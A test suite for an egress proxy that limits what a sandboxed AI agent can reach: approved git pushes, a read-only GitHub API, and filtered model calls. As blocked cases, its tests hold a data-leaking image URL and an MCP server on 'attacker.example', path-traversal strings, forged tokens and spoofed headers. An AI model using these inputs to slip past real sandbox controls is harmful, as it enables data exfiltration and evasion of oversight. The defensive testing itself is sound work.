import { exports } from "cloudflare:workers";
import { beforeEach, describe, expect, it, vi } from "vitest";

import { classifyApi, classifyGit, describePush, isLocalItem, parseReceivePack } from "../src/workers/sandbox/outbound";
import { task } from "./helpers";

/** What the proxy let through to the outside world. */
let forwarded: { url: string; method: string; headers: Headers; body: string; redirect?: string }[] = [];
/** What the outside world says next, in order; "upstream ok" once these run out. */
let answers: (() => Response)[] = [];

beforeEach(() => {
  forwarded = [];
  answers = [];
  vi.stubGlobal("fetch", async (input: RequestInfo | URL, init?: RequestInit) => {
    const request = new Request(input as RequestInfo, init);
    forwarded.push({ url: request.url, method: request.method, headers: request.headers, body: await request.text(), redirect: request.redirect });
    return answers.shift()?.() ?? new Response("upstream ok");
  });
});

let counter = 0;
/** A proxy bound to a fresh task, the way each sandbox gets its own. */
async function proxyFor(policy: Parameters<any>[0] = {}) {
  const taskId = `00000000-0000-4000-8000-${String(++counter).padStart(12, "0")}`;
  await task(taskId).configure(policy);
  const proxy = (exports as any).Outbound({ props: { taskId } });
  const send = (url: string, init?: RequestInit) => proxy.fetch(new Request(url, init)) as Promise<Response>;
  const recorded = async (method: string) => (await task(taskId).calls()).filter((c: any) => c.method === method).map((c: any) => c.args);
  return { send, recorded };
}

const pkt = (line: string) => (line.length + 4).toString(16).padStart(4, "0") + line;
const A = "a".repeat(40);
const B = "b".repeat(40);
const ZERO = "0".repeat(40);
const pushBody = (...commands: string[]) =>
  new TextEncoder().encode(commands.map((c, i) => pkt(i === 0 ? `${c}\0report-status side-band-64k\n` : `${c}\n`)).join("") + "0000PACK....");

describe("reading a push", () => {
  it("lists exactly which refs would move", () => {
    expect(parseReceivePack(pushBody(`${A} ${B} refs/heads/main`, `${ZERO} ${B} refs/tags/v1`))).toEqual([
      { old: A, new: B, ref: "refs/heads/main" },
      { old: ZERO, new: B, ref: "refs/tags/v1" },
    ]);
  });

  it("reads a push from a shallow clone, which lists its shallow boundary first", () => {
    // Captured from `git push` in a --depth 1 clone (git 2.54).
    const body = new TextEncoder().encode(pkt(`shallow ${A}\n`) + pkt(`${A} ${B} refs/heads/main\0 report-status-v2 side-band-64k quiet object-format=sha1 agent=git/2.54.0\n`) + "0000PACK....");
    expect(parseReceivePack(body)).toEqual([{ old: A, new: B, ref: "refs/heads/main" }]);
    // A shallow line after the commands have started is not part of the grammar.
    const odd = new TextEncoder().encode(pkt(`${A} ${B} refs/heads/main\0caps\n`) + pkt(`shallow ${A}\n`) + "0000");
    expect(parseReceivePack(odd)).toBeUndefined();
  });

  it("refuses to interpret anything it does not fully understand", () => {
    const bytes = (text: string) => new TextEncoder().encode(text);
    expect(parseReceivePack(bytes("not a pkt-line"))).toBeUndefined();
    expect(parseReceivePack(bytes(pkt(`${A} ${B} refs/heads/main\n`)))).toBeUndefined(); // no flush packet
    expect(parseReceivePack(bytes(pkt("push-cert\0report-status\n") + "0000"))).toBeUndefined();
    expect(parseReceivePack(bytes(pkt(`${A} ${B} HEAD\n`) + "0000"))).toBeUndefined();
    expect(parseReceivePack(bytes(pkt(`${A} ${B} refs/heads/a b\n`) + "0000"))).toBeUndefined();
    expect(parseReceivePack(bytes("ffff" + "x".repeat(10)))).toBeUndefined();
  });

  it("describes a push in words a person can decide on", () => {
    // Commit ids are shown whole: this line is what a person approves.
    expect(describePush("acme/demo", [{ old: A, new: B, ref: "refs/heads/main" }])).toBe(`push to acme/demo: move branch main from ${A} to ${B}`);
    expect(describePush("acme/demo", [{ old: A, new: ZERO, ref: "refs/heads/old" }])).toContain("delete branch old");
    expect(describePush("acme/demo", [{ old: ZERO, new: B, ref: "refs/tags/v1" }])).toContain(`create tag v1 at ${B}`);
  });

  it("recognises git endpoints and nothing else on github.com", () => {
    const at = (path: string, method = "GET") => classifyGit(new URL(`https://github.com${path}`), method);
    expect(at("/acme/demo.git/info/refs?service=git-upload-pack")).toMatchObject({ repo: "acme/demo", push: false });
    expect(at("/acme/demo/info/refs?service=git-receive-pack")).toMatchObject({ repo: "acme/demo", push: true });
    expect(at("/acme/demo/git-receive-pack", "POST")).toMatchObject({ push: true });
    expect(at("/acme/demo/git-receive-pack", "GET")).toBeUndefined();
    expect(at("/acme/demo")).toBeUndefined();
    expect(at("/acme/demo/info/refs")).toBeUndefined();
    expect(at("/acme/../info/refs?service=git-upload-pack")).toBeUndefined();
  });
});

describe("what a sandbox can reach", () => {
  it("passes reports home with the task's credential, and nothing else decides whose task it is", async () => {
    const { send, recorded } = await proxyFor();
    const ok = await send("http://brain.internal/callback/progress", { method: "POST", headers: { "x-task-token": "good", "x-task-id": "someone-elses-task" }, body: '{"message":"step 1"}' });
    expect(ok.status).toBe(200);
    expect(await recorded("callback")).toEqual([{ kind: "progress", token: "good", body: { message: "step 1" } }]);
    expect((await send("http://brain.internal/callback/progress", { method: "POST", headers: { "x-task-token": "forged" }, body: "{}" })).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("lends credentials to an exact origin, not to the same host on another port", async () => {
    const { send } = await proxyFor({ repository: "acme/demo" });
    expect((await send("https://model.test:8443/v1/responses", { method: "POST", body: JSON.stringify({ model: "test-model", input: "hi" }) })).status).toBe(403);
    expect((await send("https://github.com:8443/acme/demo.git/info/refs?service=git-upload-pack")).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("blocks every other host and records the attempt", async () => {
    const { send, recorded } = await proxyFor();
    expect((await send("https://example.com/")).status).toBe(403);
    expect((await send("http://api.openai.com/v1/responses", { method: "POST", body: "{}" })).status).toBe(403);
    expect(forwarded).toHaveLength(0);
    expect((await recorded("observe")).map((o: any) => o.body.host)).toEqual(["example.com", "api.openai.com"]);
  });
});

describe("after a task has ended", () => {
  it("lets nothing out on its behalf, not even a read", async () => {
    const { send } = await proxyFor({ repository: "acme/demo", ended: true });
    expect((await send("https://model.test/v1/models")).status).toBe(403);
    expect((await send("https://github.com/acme/demo.git/info/refs?service=git-upload-pack")).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });
});

describe("the model key", () => {
  const callModel = (send: (url: string, init?: RequestInit) => Promise<Response>, model: string, path = "/v1/responses") =>
    send(`https://model.test${path}`, { method: "POST", headers: { authorization: "Bearer provided-by-worker" }, body: JSON.stringify({ model, input: "hi" }) });

  it("is added by the proxy, replacing whatever the guest sent", async () => {
    const { send } = await proxyFor();
    expect((await callModel(send, "test-model")).status).toBe(200);
    expect(forwarded).toHaveLength(1);
    expect(forwarded[0].headers.get("authorization")).toBe("Bearer test-key");
    expect(JSON.parse(forwarded[0].body)).toEqual({ model: "test-model", input: "hi" });
  });

  it("does not let the guest have the provider reach out on its behalf", async () => {
    const { send } = await proxyFor();
    const withTools = (tools: unknown) => send("https://model.test/v1/responses", { method: "POST", body: JSON.stringify({ model: "test-model", input: "hi", tools }) });
    expect((await withTools([{ type: "function", name: "bash" }])).status).toBe(200);
    expect((await withTools([{ type: "mcp", server_url: "https://attacker.example/mcp" }])).status).toBe(403);
    expect((await withTools([{ type: "function", name: "bash" }, { type: "web_search" }])).status).toBe(403);
    expect((await withTools("not a list")).status).toBe(403);
    // Hosted tools can also be smuggled in as conversation items.
    const withInput = (input: unknown) => send("https://model.test/v1/responses", { method: "POST", body: JSON.stringify({ model: "test-model", input }) });
    expect((await withInput([{ role: "user", content: "hi" }, { type: "function_call", call_id: "c", name: "bash", arguments: "{}" }, { type: "function_call_output", call_id: "c", output: "ok" }, { type: "reasoning", summary: [] }])).status).toBe(200);
    expect((await withInput([{ type: "mcp_approval_response", approve: true, approval_request_id: "x" }])).status).toBe(403);
    expect((await withInput([{ type: "mcp_list_tools", server_label: "x", tools: [] }])).status).toBe(403);
    expect((await withInput(["a string item"])).status).toBe(403);
    // An item given only by id points at something stored on the provider's side.
    expect((await withInput([{ id: "msg_someone_elses" }])).status).toBe(403);
    expect((await withInput([{ type: "item_reference", id: "msg_someone_elses" }])).status).toBe(403);
    expect((await withInput([{ type: "function_call", id: "fc_someone_elses" }])).status).toBe(403);
    // Nothing stored on the provider's side may be referred to: under a shared key it could be anyone's.
    const withField = (extra: Record<string, unknown>) => send("https://model.test/v1/responses", { method: "POST", body: JSON.stringify({ model: "test-model", input: "hi", ...extra }) });
    expect((await withField({ previous_response_id: "resp_someone_elses" })).status).toBe(403);
    expect((await withField({ conversation: "conv_someone_elses" })).status).toBe(403);
    // An image by URL would have the provider fetch an address the guest chose; inline data is fine.
    const image = (image_url: string) => [{ role: "user", content: [{ type: "input_image", image_url }] }];
    expect((await withInput(image("https://attacker.example/x.png?leak=secret"))).status).toBe(403);
    expect((await withInput(image("data:image/png;base64,AAAA"))).status).toBe(200);
    expect((await send("https://model.test/v1/responses/compact", { method: "POST", body: JSON.stringify({ model: "test-model" }) })).status).toBe(403);
    expect(forwarded).toHaveLength(3);
  });

  it("pays only for the configured model, on the model endpoint, within the task's allowance", async () => {
    const { send } = await proxyFor({ modelCalls: 1 });
    expect((await callModel(send, "a-pricier-model")).status).toBe(403);
    expect((await callModel(send, "test-model", "/v1/files")).status).toBe(403);
    expect((await send("https://model.test/v1/responses", { method: "POST", body: "not json" })).status).toBe(403);
    expect(forwarded).toHaveLength(0);
    expect((await callModel(send, "test-model")).status).toBe(200);
    expect((await callModel(send, "test-model")).status).toBe(429);
    expect(forwarded).toHaveLength(1);
  });
});

describe("git over the proxy", () => {
  const advert = "https://github.com/acme/demo.git/info/refs?service=git-upload-pack";
  const push = (send: (url: string, init?: RequestInit) => Promise<Response>, repo = "acme/demo", body: BodyInit = pushBody(`${A} ${B} refs/heads/main`)) =>
    send(`https://github.com/${repo}.git/git-receive-pack`, { method: "POST", body });

  it("lends the token only for the repository the task was started on", async () => {
    const { send } = await proxyFor({ repository: "acme/demo" });
    await send(advert);
    await send("https://github.com/acme/secret.git/info/refs?service=git-upload-pack", { headers: { authorization: "Basic guessed" } });
    expect(forwarded[0].headers.get("authorization")).toBe(`Basic ${btoa("x-access-token:test-github-token")}`);
    expect(forwarded[1].headers.get("authorization")).toBeNull();
  });

  it("offers nothing on github.com except git", async () => {
    const { send } = await proxyFor({ repository: "acme/demo" });
    expect((await send("https://github.com/acme/demo/settings")).status).toBe(403);
    expect((await send("https://github.com/login/oauth/access_token", { method: "POST", body: "x" })).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("never pushes to a repository the task was not started on", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "allow", reason: "" }] });
    expect((await push(send, "acme/other")).status).toBe(403);
    expect(forwarded).toHaveLength(0);
    expect(await recorded("authorize")).toHaveLength(0);
  });

  it("does not send an approved push if the task's access to the repository was withdrawn while it waited", async () => {
    // The credential is there when the push arrives, and gone by the time someone approves it.
    const { send } = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "pending", reason: "" }, { state: "allow", reason: "ok" }], tokenWithdrawnAfter: 1 });
    const response = await push(send, "acme/demo", pushBody(`${A} ${B} refs/heads/main`));
    expect(response.status).toBe(403);
    expect(await response.text()).toMatch(/no longer allowed a credential/);
    expect(forwarded).toHaveLength(0);
  });

  it("does not send even a push that moves nothing once the task's access was withdrawn", async () => {
    const { send } = await proxyFor({ repository: "acme/demo", tokenWithdrawnAfter: 1 });
    const response = await push(send, "acme/demo", new TextEncoder().encode("0000"));
    expect(response.status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("holds a push until someone approves exactly those refs, then forwards it unchanged", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "pending", reason: "" }, { state: "allow", reason: "ok" }] });
    const body = pushBody(`${A} ${B} refs/heads/main`);
    const response = await push(send, "acme/demo", body);
    expect(response.status).toBe(200);
    const asked = await recorded("authorize");
    expect(asked).toHaveLength(2);
    expect(asked[0]).toMatchObject({ action: "git_push", resource: "acme/demo", refs: [{ old: A, new: B, ref: "refs/heads/main" }] });
    // Both polls belong to the same held request, which has an id of its own.
    expect(asked[0].requestId).toMatch(/^[0-9a-f-]{36}$/);
    expect(asked[1].requestId).toBe(asked[0].requestId);
    expect(forwarded).toHaveLength(1);
    expect(forwarded[0].body).toBe(new TextDecoder().decode(body));
    expect(forwarded[0].headers.get("authorization")).toContain("Basic ");
  });

  it("gives two identical pushes two separate questions", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "allow", reason: "" }] });
    await push(send);
    await push(send);
    const [first, second] = await recorded("authorize");
    expect(first.requestId).not.toBe(second.requestId);
  });

  it("does not forward a push that was denied or that it cannot read", async () => {
    const denied = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "deny", reason: "not on main" }] });
    const response = await push(denied.send);
    expect(response.status).toBe(403);
    expect(await response.text()).toContain("not on main");

    const unreadable = await proxyFor({ repository: "acme/demo", verdicts: [{ state: "allow", reason: "" }] });
    expect((await push(unreadable.send, "acme/demo", "garbage")).status).toBe(403);
    expect(await unreadable.recorded("authorize")).toHaveLength(0);
    expect(forwarded).toHaveLength(0);
  });
});

describe("GitHub's API over the proxy", () => {
  const issues = "https://api.github.com/repos/acme/demo/issues?state=all&per_page=100";
  const search = (q: string, more = "") => `https://api.github.com/search/issues?q=${encodeURIComponent(q)}${more}`;
  const found = (repo: string, number: number) => ({ number, title: `t${number}`, repository_url: `https://api.github.com/repos/${repo}` });

  it("recognises reads of one repository and the search of issues, and nothing else", () => {
    const api = (path: string, method = "GET") => classifyApi(new URL(`https://api.github.com${path}`), method);
    expect(api("/repos/acme/demo")).toEqual({ repo: "acme/demo" });
    expect(api("/repos/Acme/Demo/issues/7/comments", "HEAD")).toEqual({ repo: "Acme/Demo" });
    expect(api("/repos/acme/demo/compare/main...topic")).toEqual({ repo: "acme/demo" });
    expect(api("/search/issues")).toEqual({ search: true });
    for (const method of ["POST", "PATCH", "PUT", "DELETE", "OPTIONS"]) expect(api("/repos/acme/demo/issues", method)).toBeUndefined();
    for (const path of ["/", "/user", "/graphql", "/repos/acme", "/repos/../demo/issues", "/repos/acme/../issues", "/repos/acme/demo%2f..%2fsecret/issues", "/repos/acme/demo/contents/a%2e%2e/b", "/repos/acme/demo//issues", "/search/code", "/search/issues/x", "/app/installations/1/access_tokens", "/orgs/acme/repos"])
      expect(api(path), path).toBeUndefined();
    // The other side of a comparison named in another repository is a read of that one.
    for (const path of ["/repos/acme/demo/compare/main...someone:topic", "/repos/acme/demo/compare/main...someone%3Atopic", "/repos/acme/demo/compare/someone:demo:main...topic"]) expect(api(path), path).toBeUndefined();
  });

  it("reads the task's own repository with a credential that can only read, and with headers made here", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    expect(await (await send(issues, { headers: { authorization: "Bearer guessed", cookie: "session=1", accept: "application/vnd.github+json", "x-github-api-version": "2022-11-28", "if-none-match": '"abc"', "x-http-method-override": "POST", "x-forwarded-host": "evil.example", "user-agent": "curl/8" } })).text()).toBe("upstream ok");
    expect(forwarded).toHaveLength(1);
    expect(forwarded[0]).toMatchObject({ url: issues, method: "GET", redirect: "manual" });
    expect(Object.fromEntries(forwarded[0].headers)).toEqual({ authorization: "Bearer test-read-token", accept: "application/vnd.github+json", "x-github-api-version": "2022-11-28", "if-none-match": '"abc"', "user-agent": "always-on-agent" });
    expect(await recorded("noteGithubRead")).toEqual([{ kind: "other", status: 200, incomplete: false }]);
  });

  it("reads it with no credential at all where the task is lent none", async () => {
    const { send } = await proxyFor({ repository: "acme/demo", unlent: true });
    await send(issues, { headers: { authorization: "Bearer guessed" } });
    expect(forwarded[0].headers.get("authorization")).toBeNull();
  });

  it("writes nothing, and reads no other repository nor anything else there", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    expect((await send("https://api.github.com/repos/acme/demo/issues", { method: "POST", body: "{}" })).status).toBe(403);
    expect((await send("https://api.github.com/repos/acme/demo/issues/1/comments", { method: "POST", body: "{}" })).status).toBe(403);
    expect((await send("https://api.github.com/graphql", { method: "POST", body: "{}" })).status).toBe(403);
    expect((await send("https://api.github.com/repos/acme/other/issues")).status).toBe(403);
    expect((await send("https://api.github.com/user")).status).toBe(403);
    expect((await send("https://api.github.com:8443/repos/acme/demo/issues")).status).toBe(403);
    expect((await send("http://api.github.com/repos/acme/demo/issues")).status).toBe(403);
    expect((await send("https://api.github.com/repos/acme/demo/compare/main...someone:topic")).status).toBe(403);
    expect(forwarded).toHaveLength(0);
    expect(await recorded("observe")).toHaveLength(8);
    // A task with no repository reads none.
    const bare = await proxyFor({});
    expect((await bare.send(issues)).status).toBe(403);
    expect((await bare.send(search("bug"))).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("lets nothing through once the task has ended, also when it ends while a credential is asked for", async () => {
    const ended = await proxyFor({ repository: "acme/demo", ended: true });
    expect((await ended.send(issues)).status).toBe(403);
    // No credential is what a task that is lent none gets, and what one that has ended gets: the second is not read for anonymously.
    const ending = await proxyFor({ repository: "acme/demo", endsWhileLending: true });
    expect((await ending.send(issues)).status).toBe(403);
    expect(forwarded).toHaveLength(0);
  });

  it("does not pass on an address somewhere else that it is answered with", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    // An archive of a private repository: an address good for a while for whoever holds it.
    answers.push(() => new Response(null, { status: 302, headers: { location: "https://codeload.github.com/acme/demo/legacy.tar.gz/main?token=SIGNED" } }));
    const answer = await send("https://api.github.com/repos/acme/demo/tarball/main", { redirect: "manual" });
    expect(answer.status).toBe(403);
    expect(answer.headers.get("location")).toBeNull();
    expect(await answer.text()).not.toContain("SIGNED");
    // One to another place on the API itself (a repository that was renamed) is handed back for the guest to ask again.
    answers.push(() => new Response(null, { status: 301, headers: { location: "https://api.github.com/repositories/42/issues" } }));
    const moved = await send(issues, { redirect: "manual" });
    expect(moved.status).toBe(301);
    expect(moved.headers.get("location")).toBe("https://api.github.com/repositories/42/issues");
    // Which is then not a path it may read.
    expect((await send("https://api.github.com/repositories/42/issues")).status).toBe(403);
    expect(forwarded).toHaveLength(2);
    expect(await recorded("noteGithubRead")).toEqual([
      { kind: "other", status: 302, incomplete: true },
      { kind: "other", status: 301, incomplete: false },
    ]);
  });

  it("searches issues in the task's repository only, whatever the query names", async () => {
    const { send } = await proxyFor({ repository: "acme/demo" });
    const sent = async (q: string) => {
      answers.push(() => Response.json({ total_count: 0, incomplete_results: false, items: [] }));
      await send(search(q, "&per_page=50&sort=updated"));
      return new URL(forwarded.at(-1)!.url).searchParams;
    };
    expect((await sent("time zone is:issue")).get("q")).toBe("repo:acme/demo time zone is:issue");
    expect((await sent("time zone repo:acme/secret ORG:acme -user:someone is:issue")).get("q")).toBe("repo:acme/demo time zone is:issue");
    // "or", "not" and brackets: the repository is said of the whole of it.
    expect((await sent("dst OR timezone")).get("q")).toBe("repo:acme/demo (dst OR timezone)");
    expect((await sent("(dst OR timezone) is:open NOT reminder")).get("q")).toBe("repo:acme/demo ((dst OR timezone) is:open NOT reminder)");
    expect((await sent("dst OR repo:acme/secret")).get("q")).toBe("repo:acme/demo (dst OR)");
    expect((await sent("")).get("q")).toBe("repo:acme/demo");
    const last = await sent("dst");
    expect(last.get("per_page")).toBe("50");
    expect(last.get("sort")).toBe("updated");
    expect(forwarded.at(-1)!.headers.get("authorization")).toBe("Bearer test-read-token");
  });

  it("passes a search on whole where all of it is the repository's, page after page", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    answers.push(() => Response.json({ total_count: 3, incomplete_results: false, items: [found("acme/demo", 1), found("Acme/Demo", 2)] }, { headers: { link: '<https://api.github.com/search/issues?page=2>; rel="next"', "x-ratelimit-remaining": "9", "set-cookie": "a=b" } }));
    const first = await send(search("dst"));
    expect(await first.json()).toEqual({ total_count: 3, incomplete_results: false, items: [found("acme/demo", 1), found("Acme/Demo", 2)] });
    expect(first.headers.get("link")).toContain('rel="next"');
    expect(first.headers.get("x-ratelimit-remaining")).toBe("9");
    expect(first.headers.get("set-cookie")).toBeNull();
    answers.push(() => Response.json({ total_count: 3, incomplete_results: false, items: [found("acme/demo", 3)] }));
    expect(((await (await send(search("dst", "&page=2"))).json()) as { items: unknown[] }).items).toHaveLength(1);
    // None at all, known to be all there is.
    answers.push(() => Response.json({ total_count: 0, incomplete_results: false, items: [] }));
    expect(await (await send(search("nothing like it"))).json()).toEqual({ total_count: 0, incomplete_results: false, items: [] });
    expect(await recorded("noteGithubRead")).toEqual([
      { kind: "search", status: 200, incomplete: false },
      { kind: "search", status: 200, incomplete: false },
      { kind: "search", status: 200, incomplete: false },
    ]);
  });

  it("says a search is not complete where something of another repository came back, and gives no count", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    answers.push(() => Response.json({ total_count: 40, incomplete_results: false, items: [found("acme/demo", 1), found("acme/secret", 2)] }));
    expect(await (await send(search("dst"))).json()).toEqual({ incomplete_results: true, items: [found("acme/demo", 1)] });
    // A page with nothing of this repository on it, others of it perhaps to come: not "none".
    answers.push(() => Response.json({ total_count: 40, incomplete_results: false, items: [found("acme/secret", 2), found("other/thing", 3)] }));
    expect(await (await send(search("dst"))).json()).toEqual({ incomplete_results: true, items: [] });
    // GitHub's own word that it was cut short, or no word at all.
    answers.push(() => Response.json({ total_count: 1, incomplete_results: true, items: [found("acme/demo", 1)] }));
    expect(((await (await send(search("dst"))).json()) as { incomplete_results: boolean }).incomplete_results).toBe(true);
    answers.push(() => Response.json({ total_count: 1, items: [found("acme/demo", 1)] }));
    expect(((await (await send(search("dst"))).json()) as { incomplete_results: boolean }).incomplete_results).toBe(true);
    expect((await recorded("noteGithubRead")).map((each: any) => each.incomplete)).toEqual([true, true, true, true]);
  });

  it("says how a read went when it did not go well, never as nothing found", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo", unlent: true });
    answers.push(() => Response.json({ message: "API rate limit exceeded" }, { status: 403, headers: { "x-ratelimit-remaining": "0" } }));
    const limited = await send(search("dst"));
    expect(limited.status).toBe(403);
    expect(((await limited.json()) as { message: string }).message).toContain("rate limit");
    // An answer to a search that cannot be read, or whose rows do not say where they are from.
    answers.push(() => new Response("not json", { status: 200 }));
    expect((await send(search("dst"))).status).toBe(502);
    answers.push(() => Response.json({ total_count: 1, incomplete_results: false, items: [{ number: 1 }] }));
    expect((await send(search("dst"))).status).toBe(502);
    answers.push(() => Response.json({ total_count: 0, incomplete_results: false }));
    expect((await send(search("dst"))).status).toBe(502);
    // Asked for the headers alone: there is nothing to read, and that is not a fault.
    answers.push(() => new Response(null, { status: 200, headers: { link: '<x>; rel="next"' } }));
    expect((await send(search("dst"), { method: "HEAD" })).status).toBe(200);
    answers.push(() => new Response("gone", { status: 404 }));
    expect((await send("https://api.github.com/repos/acme/demo/issues/999")).status).toBe(404);
    // GitHub not reached at all.
    answers.push(() => {
      throw new Error("network");
    });
    expect((await send(search("dst"))).status).toBe(502);
    expect(await recorded("noteGithubRead")).toEqual([
      { kind: "search", status: 403, incomplete: false },
      { kind: "search", status: 502, incomplete: true },
      { kind: "search", status: 502, incomplete: true },
      { kind: "search", status: 502, incomplete: true },
      { kind: "search", status: 200, incomplete: false },
      { kind: "other", status: 404, incomplete: false },
      { kind: "search", status: 0, incomplete: true },
    ]);
    // Nor a credential had: nothing is read, and that is counted.
    const failing = await proxyFor({ repository: "acme/demo", lendingFails: true });
    const before = forwarded.length;
    expect((await failing.send(search("dst"))).status).toBe(502);
    expect(forwarded).toHaveLength(before);
    expect(await failing.recorded("noteGithubRead")).toEqual([{ kind: "search", status: 0, incomplete: true }]);
  });
});

describe("what the agent sends the model for a note brought into its session", () => {
  // As pi 0.87.1 was seen to send it to a Responses-style model (eval/lab/notes.lab.mjs, case J).
  it("is a plain message of the user's, which the sandbox lets out as any other", () => {
    const item = { role: "user", content: [{ type: "input_text", text: "[Added by the person who asked for this work, while you were at it. …]\n\nalso fix the footer" }] };
    expect(isLocalItem(item)).toBe(true);
    // And still nothing that names something for the provider to fetch.
    expect(isLocalItem({ type: "custom_message", content: "x" })).toBe(false);
  });
});
